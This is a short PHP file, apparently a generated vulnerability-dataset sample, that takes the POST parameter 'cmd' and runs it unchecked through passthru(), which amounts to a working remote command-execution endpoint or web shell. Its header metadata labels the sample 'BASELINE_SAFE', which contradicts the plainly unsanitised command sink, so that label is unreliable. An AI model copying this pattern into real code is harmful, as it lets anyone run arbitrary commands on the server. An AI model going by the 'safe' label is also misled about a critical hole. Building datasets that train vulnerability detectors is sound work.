<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST_FALLBACK; SKELETON=S1; KEY=cmd; SINK=B4; VAR=v0105 */
function SINK_B4($command){
    passthru($command);
}
$t = filter_input(INPUT_POST, "cmd");
$inp = ($t !== null && $t !== false) ? (string)$t : (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B4($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
